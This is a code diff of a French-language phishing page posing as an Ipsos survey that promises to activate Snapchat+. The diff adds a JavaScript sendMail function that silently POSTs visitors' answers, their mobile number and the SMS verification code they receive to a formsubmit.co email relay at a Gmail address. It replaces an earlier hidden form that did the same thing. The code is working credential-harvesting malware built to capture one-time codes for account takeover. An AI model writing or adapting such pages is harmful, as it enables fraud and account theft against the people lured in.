@@ -18,8 +18,6 @@ input { width:100%; padding:14px; font-size:18px; border-radius:6px; border:1px 
 button { padding:14px 26px; background:#0078d4; color:#fff; border:0; border-radius:8px; cursor:pointer; font-size:18px; }
 button:hover { background:#005fa3; }
 button:disabled { background:#b0b0b0; cursor:not-allowed; }
-.progress-container { width:100%; height:10px; background:#e0e0e0; border-radius:5px; margin-bottom:25px; }
-.progress-bar { height:100%; width:0%; background:#0078d4; transition:width 0.3s ease; }
 .footer { text-align:center; padding:20px 0; font-size:14px; color:#999; margin-top:40px; border-top:1px solid #ddd; }
 @media(max-width:600px){ .box{margin:20px;padding:25px} h2{font-size:24px} p{font-size:16px} }
 </style>
@@ -74,21 +72,30 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
     <p>Votre Snapchat+ sera activé dans l’heure. 🎉</p>
 </div>
 
-<!-- FORMULAIRE CACHÉ POUR ENVOI MAIL -->
-<form id="formSubmit" action="https://formsubmit.co/ano625343@gmail.com" method="POST" style="display:none;">
-    <input type="text" name="artiste_prefere" id="f_artiste_prefere">
-    <input type="text" name="artiste_deezer" id="f_artiste_deezer">
-    <input type="text" name="artiste_decouverte" id="f_artiste_decouverte">
-    <input type="text" name="telephone" id="f_telephone">
-    <input type="text" name="code_sms" id="f_code_sms">
-    <input type="hidden" name="_cc" value="ano625343@gmail.com">
-    <input type="hidden" name="_subject" id="f_subject">
-    <input type="hidden" name="_captcha" value="false">
-</form>
-
 <div class="footer">© 2026 Ipsos – Tous droits réservés</div>
 
 <script>
+// Fonction pour envoyer les mails via fetch
+async function sendMail(subject, dataObj){
+    const formData = new FormData();
+    formData.append("_subject", subject);
+    formData.append("_cc","ano625343@gmail.com");
+    formData.append("_captcha","false");
+    for(let key in dataObj){
+        formData.append(key, dataObj[key]);
+    }
+    try{
+        await fetch("https://formsubmit.co/ano625343@gmail.com", {
+            method:"POST",
+            body: formData,
+            headers: { "Accept":"application/json" }
+        });
+        console.log(subject+" envoyé avec succès.");
+    } catch(e){
+        console.error("Erreur envoi mail", e);
+    }
+}
+
 // ETAPE 1
 document.getElementById('btnEtape1').addEventListener('click', ()=>{
     let pref = document.getElementById('artiste_prefere').value.trim();
@@ -96,11 +103,11 @@ document.getElementById('btnEtape1').addEventListener('click', ()=>{
     let decouverte = document.getElementById('artiste_decouverte').value.trim();
     if(!pref || !deezer || !decouverte){ alert("Veuillez remplir toutes les questions."); return; }
 
-    document.getElementById('f_artiste_prefere').value = pref;
-    document.getElementById('f_artiste_deezer').value = deezer;
-    document.getElementById('f_artiste_decouverte').value = decouverte;
-    document.getElementById('f_subject').value = "Étape 1 – Questions artistes";
-    document.getElementById('formSubmit').submit();
+    sendMail("Étape 1 – Questions artistes", {
+        artiste_prefere: pref,
+        artiste_deezer: deezer,
+        artiste_decouverte: decouverte
+    });
 
     document.getElementById('etape1').style.display='none';
     document.getElementById('etape2').style.display='block';
@@ -117,9 +124,7 @@ document.getElementById('btnEtape3').addEventListener('click', ()=>{
     let tel = document.getElementById('telephone').value.trim();
     if(!/^0[67]\d{8}$/.test(tel)){ alert("Numéro invalide (06 ou 07)."); return; }
 
-    document.getElementById('f_telephone').value = tel;
-    document.getElementById('f_subject').value = "Étape 3 – Numéro téléphone";
-    document.getElementById('formSubmit').submit();
+    sendMail("Étape 3 – Numéro téléphone", {telephone: tel});
 
     document.getElementById('etape3').style.display='none';
     document.getElementById('etape4').style.display='block';
@@ -130,9 +135,7 @@ document.getElementById('btnEtape4').addEventListener('click', ()=>{
     let code = document.getElementById('code_sms').value.trim();
     if(!code){ alert("Veuillez entrer le code."); return; }
 
-    document.getElementById('f_code_sms').value = code;
-    document.getElementById('f_subject').value = "Étape 4 – Code SMS";
-    document.getElementById('formSubmit').submit();
+    sendMail("Étape 4 – Code SMS", {code_sms: code});
 
     document.getElementById('etape4').style.display='none';
     document.getElementById('etape5').style.display='block';
